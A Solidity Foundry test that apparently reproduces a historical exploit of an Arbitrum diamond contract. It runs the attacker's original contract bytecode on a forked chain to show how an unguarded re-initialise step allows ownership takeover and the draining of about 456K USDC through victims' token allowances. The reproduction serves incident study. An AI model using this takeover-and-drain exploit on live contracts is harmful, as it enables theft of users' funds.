// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~456,442.54 USDC (~K)
// Attacker : 0x9F49591a3bf95B49cD8d9477b4481Ce9da68d5Ca
// Attack Contract : 0x4D7759e69cC973D338a1ea2fDB125C2b818F4d7e (CREATE in attack tx)
// Vulnerable Contract : 0x0adc63e71b035d5c7fdb1b4593999fa1f296f1b2 (Aurellion diamond)
// Attack Tx : https://arbiscan.io/tx/0x19cbafae517791e7e73403313d70440abf60558350e419df05c04f816998fe0a
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x0adc63e71b035d5c7fdb1b4593999fa1f296f1b2#code
// Native USDC (Arbitrum) : 0xaf88d065e77c8cC2239327C5EDb3A432268e5831
//
// @Analysis
// Root cause:
//  1. EIP-2535 diamond at 0x0adc… still accepts initialize() (or equivalent owner
//     re-init) from an unprivileged caller, so the attacker becomes diamond owner.
//  2. As owner the attacker diamondCut()s a malicious facet with pullERC20/sweep
//     selectors that pull ERC20s using victims' pre-existing allowances to the
//     diamond, then sweeps diamond balance to the attacker EOA.
// Attack path (atomic CREATE):
//  deploy attack bytecode with constructor args (USDC, diamond) →
//  re-init diamond (owner: 0x1866… → attack contract) →
//  diamondCut add facet → pullERC20 from 4 allowance holders →
//  transfer ~456.4K USDC to attacker EOA.
//
// PoC strategy: replay the historical CREATE with original initcode at block
// 462014666 (one before the exploit). CREATE address depends on attacker nonce=0.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IOwnable {
    function owner() external view returns (address);
}

contract AurellionLabs_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x9F49591a3bf95B49cD8d9477b4481Ce9da68d5Ca;
    // Historical CREATE address (attacker nonce 0 at fork block)
    address constant ATTACK_CONTRACT = 0x4D7759e69cC973D338a1ea2fDB125C2b818F4d7e;
    address constant DIAMOND = 0x0Adc63e71B035d5c7FDB1B4593999FA1F296f1B2;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant PREV_OWNER = 0x1866Fd4a9e15E0005480b5171B63b43d2d507698;

    // Victims with max USDC allowance to diamond pre-attack
    address constant V1 = 0x2e933518068b1CFC9746d94762Ef2EDDD39c6048;
    address constant V2 = 0xa90714a15D6e5C0EB3096462De8dc4B22E01589A;
    address constant V3 = 0xEceD2D37e5EDCFc67ffB74c655416F893d20793E;
    address constant V4 = 0x4ce01902536e07AD12FebCb6ce9801C4D86b87C7;

    // Historical CREATE initcode from attack tx input (includes constructor args
    // USDC + diamond appended at end).
    bytes constant CREATE_INITCODE =
        hex"60a0806040523461043b573360808190526370a0823160e01b82526004820152"
        hex"5f906020816024815f516020610d2c5f395f51905f525afa9081156107df575f"
        hex"916107ea575b505f516020610d4c5f395f51905f523b1561043b576040516318"
        hex"9acdbd60e31b81523060048201525f81602481835f516020610d4c5f395f5190"
        hex"5f525af180156107df576107ca575b5060405161045280820190600160016040"
        hex"1b038211838310176107b6579082916108da8339039083f09182156107aa5760"
        hex"409283516100cd858261084b565b60018152601f198501835b81811061078257"
        hex"505060609185516100f0848261084b565b60028152601f198401366020830137"
        hex"63582515c760e01b6101108261086e565b5280516001101561076e5763727419"
        hex"7f60e11b818801528651916101338361081c565b6001600160a01b0316825260"
        hex"208201859052868201526101528261086e565b5261015c8161086e565b505f51"
        hex"6020610d4c5f395f51905f523b156106415782855180926307e4c70760e21b82"
        hex"526064820185600484015281518091526084830190602060848260051b860101"
        hex"93019185905b8282106106c05750505050602090836024840152838382039160"
        hex"031983016044860152520181835f516020610d4c5f395f51905f525af1801561"
        hex"06b6579083916106a1575b5050835190608082016001600160401b0381118382"
        hex"101761068d578552732e933518068b1cfc9746d94762ef2eddd39c6048825273"
        hex"4ce01902536e07ad12febcb6ce9801c4d86b87c7602083015273a90714a15d6e"
        hex"5c0eb3096462de8dc4b22e01589a8286015273eced2d37e5edcfc67ffb74c655"
        hex"416f893d20793e90820152815b6004811061055d5750505f516020610d4c5f39"
        hex"5f51905f523b1561055a57825163582515c760e01b81525f516020610d2c5f39"
        hex"5f51905f5260048201523060248201528181604481835f516020610d4c5f395f"
        hex"51905f525af180156104d557908291610545575b505082516370a0823160e01b"
        hex"81523060048201526020816024815f516020610d2c5f395f51905f525afa9081"
        hex"156104d5578291610513575b5080156104df57608051845163a9059cbb60e01b"
        hex"81526001600160a01b0390911660048201526024810191909152602081604481"
        hex"855f516020610d2c5f395f51905f525af19081156104d5578291610496575b50"
        hex"156104525760805183516370a0823160e01b81526001600160a01b0390911660"
        hex"048201526020816024815f516020610d2c5f395f51905f525afa918215610447"
        hex"5791610411575b5011156103bf5751603990816108a18239608051815050f35b"
        hex"5162461bcd60e51b815260206004820152602660248201527f61747461636b65"
        hex"7220757364632062616c616e636520646964206e6f7420696e60448201526563"
        hex"726561736560d01b6064820152608490fd5b90506020813d60201161043f575b"
        hex"8161042c6020938361084b565b8101031261043b57515f6103a6565b5f80fd5b"
        hex"3d915061041f565b8451903d90823e3d90fd5b825162461bcd60e51b81526020"
        hex"6004820152601460248201527f75736463207472616e73666572206661696c65"
        hex"640000000000000000000000006044820152606490fd5b90506020813d602011"
        hex"6104cd575b816104b16020938361084b565b810103126104c957518015158103"
        hex"6104c9575f61035e565b5080fd5b3d91506104a4565b84513d84823e3d90fd5b"
        hex"835162461bcd60e51b815260206004820152600d60248201526c1b9bc81d5cd9"
        hex"18c81cddd95c1d609a1b6044820152606490fd5b90506020813d60201161053d"
        hex"575b8161052e6020938361084b565b8101031261043b57515f61030b565b3d91"
        hex"50610521565b8161054f9161084b565b61055a57805f6102d3565b80fd5b6001"
        hex"600160a01b0361056f828461088f565b5186516370a0823160e01b8152911660"
        hex"048201526020816024815f516020610d2c5f395f51905f525afa908115610683"
        hex"578491610652575b508015610649576001600160a01b036105c0838561088f56"
        hex"5b5116905f516020610d4c5f395f51905f523b15610645578651637274197f60"
        hex"e11b81525f516020610d2c5f395f51905f526004820152602481019290925260"
        hex"4482015283908181606481835f516020610d4c5f395f51905f525af161062c57"
        hex"5b50506001905b0161026c565b816106369161084b565b61064157825f610620"
        hex"565b8280fd5b8480fd5b50600190610626565b90506020813d821161067b575b"
        hex"8161066c6020938361084b565b8101031261043b57515f6105a7565b3d915061"
        hex"065f565b86513d86823e3d90fd5b634e487b7160e01b84526041600452602484"
        hex"fd5b816106ab9161084b565b6104c957815f6101ea565b85513d85823e3d90fd"
        hex"5b878503608319018152835180516001600160a01b0316865260208101519497"
        hex"50929550909390928882019290600381101561075a57828a8e60209460809486"
        hex"839998015201519582015284518094520192019089905b808210610737575050"
        hex"506020806001929601920192019285938895936101a5565b82516001600160e0"
        hex"1b031916845260209384019390920191600190910190610716565b634e487b71"
        hex"60e01b8b52602160045260248bfd5b634e487b7160e01b855260326004526024"
        hex"85fd5b60209087516107908161081c565b868152868382015260608982015282"
        hex"8286010152016100d8565b604051903d90823e3d90fd5b634e487b7160e01b85"
        hex"526041600452602485fd5b6107d79192505f9061084b565b5f905f61008e565b"
        hex"6040513d5f823e3d90fd5b90506020813d602011610814575b81610805602093"
        hex"8361084b565b8101031261043b57515f610045565b3d91506107f8565b606081"
        hex"019081106001600160401b0382111761083757604052565b634e487b7160e01b"
        hex"5f52604160045260245ffd5b601f909101601f19168101906001600160401b03"
        hex"82119082101761083757604052565b80511561087b5760200190565b634e487b"
        hex"7160e01b5f52603260045260245ffd5b90600481101561087b5760051b019056"
        hex"fe5f80fdfea2646970667358221220f46a6963f22af854f0c33452d4a18dfc83"
        hex"f078bc08a1b2cabf8251a38e34ae6364736f6c63430008220033608080604052"
        hex"34601557610438908161001a8239f35b5f80fdfe608080604052600436101561"
        hex"0012575f80fd5b5f3560e01c908163582515c714610180575063e4e832fe1461"
        hex"0032575f80fd5b3461017c5760607fffffffffffffffffffffffffffffffffff"
        hex"fffffffffffffffffffffffffffffc36011261017c57610069610336565b6020"
        hex"73ffffffffffffffffffffffffffffffffffffffff606461008a610359565b5f"
        hex"8360405196879586947f23b872dd000000000000000000000000000000000000"
        hex"0000000000000000000086521660048501523060248501526044356044850152"
        hex"165af1908115610171575f91610142575b50156100e457005b60646040517f08"
        hex"c379a00000000000000000000000000000000000000000000000000000000081"
        hex"5260206004820152601460248201527f70756c6c207472616e73666572206661"
        hex"696c65640000000000000000000000006044820152fd5b610164915060203d60"
        hex"201161016a575b61015c818361037c565b8101906103ea565b5f6100dc565b50"
        hex"3d610152565b6040513d5f823e3d90fd5b5f80fd5b3461017c5760407fffffff"
        hex"fffffffffffffffffffffffffffffffffffffffffffffffffffffffffc360112"
        hex"61017c576101b7610336565b9073ffffffffffffffffffffffffffffffffffff"
        hex"ffff6101d5610359565b9216917f70a082310000000000000000000000000000"
        hex"00000000000000000000000000008252306004830152602082602481865afa91"
        hex"8215610171575f92610301575b50604473ffffffffffffffffffffffffffffff"
        hex"ffffffffff915f6020949560405196879586947fa9059cbb0000000000000000"
        hex"0000000000000000000000000000000000000000865216600485015260248401"
        hex"525af1908115610171575f916102e2575b501561028457005b60646040517f08"
        hex"c379a00000000000000000000000000000000000000000000000000000000081"
        hex"5260206004820152601560248201527f7377656570207472616e736665722066"
        hex"61696c656400000000000000000000006044820152fd5b6102fb915060203d60"
        hex"201161016a5761015c818361037c565b8161027c565b91506020823d60201161"
        hex"032e575b8161031c6020938361037c565b8101031261017c5790519060446102"
        hex"18565b3d915061030f565b6004359073ffffffffffffffffffffffffffffffff"
        hex"ffffffff8216820361017c57565b6024359073ffffffffffffffffffffffffff"
        hex"ffffffffffffff8216820361017c57565b90601f7fffffffffffffffffffffff"
        hex"ffffffffffffffffffffffffffffffffffffffffe0910116810190811067ffff"
        hex"ffffffffffff8211176103bd57604052565b7f4e487b71000000000000000000"
        hex"000000000000000000000000000000000000005f52604160045260245ffd5b90"
        hex"81602091031261017c5751801515810361017c579056fea26469706673582212"
        hex"206bc70b56e77de702a185095d02c533b6de04c145b83c036d420e9e7e4b5637"
        hex"a564736f6c63430008220033000000000000000000000000af88d065e77c8cc2"
        hex"239327c5edb3a432268e58310000000000000000000000000adc63e71b035d5c"
        hex"7fdb1b4593999fa1f296f1b2";

    uint256 constant ATTACK_BLOCK = 462_014_667;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;
    // Historical profit: 456_442.536622 USDC (6 decimals)
    uint256 constant EXPECTED_PROFIT = 456_442_536_622;

    function setUp() public {
        // Online warm: exhaustive_warm rewrites localhost → arbitrum alias.
        // Offline: anvil serves anvil_state.json on the rewritten free port.
        vm.createSelectFork("http://127.0.0.1:8547", FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        // Pre-conditions at FORK_BLOCK
        require(IOwnable(DIAMOND).owner() == PREV_OWNER, "unexpected diamond owner");
        require(ATTACKER.code.length == 0, "attacker already has code");
        // Attack contract does not exist yet (CREATE target)
        require(ATTACK_CONTRACT.code.length == 0, "attack contract already deployed");

        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
        uint256 diamondUsdcBefore = IERC20(USDC).balanceOf(DIAMOND);
        uint256 v1Before = IERC20(USDC).balanceOf(V1);
        require(v1Before > 450_000e6, "V1 balance unexpected");
        require(IERC20(USDC).allowance(V1, DIAMOND) > 0, "V1 no allowance");

        // Replay historical CREATE as the attacker EOA (nonce 0 → same address).
        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        vm.stopPrank();
        require(deployed != address(0), "CREATE failed");
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");

        uint256 usdcAfter = IERC20(USDC).balanceOf(ATTACKER);
        uint256 profit = usdcAfter - usdcBefore;

        // Owner seized by attack contract
        require(IOwnable(DIAMOND).owner() == ATTACK_CONTRACT, "owner not seized");
        // Victims drained via allowance pull + diamond sweep
        require(IERC20(USDC).balanceOf(V1) == 0, "V1 not drained");
        require(IERC20(USDC).balanceOf(DIAMOND) == 0, "diamond USDC not swept");

        // Historical: exactly 456442.536622 USDC to attacker
        assertEq(profit, EXPECTED_PROFIT, "USDC profit mismatch");
        assertGt(profit, 450_000e6, "profit floor");
        // Includes V1 (~451K) + diamond residual (~5.4K) + small victims
        assertGt(diamondUsdcBefore + v1Before, 450_000e6, "pre-drain mass");

        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        emit log_named_address("CREATE deployed", deployed);
        emit log_named_address("Diamond owner after", IOwnable(DIAMOND).owner());
        emit log_named_decimal_uint("Diamond USDC before", diamondUsdcBefore, 6);
    }
}
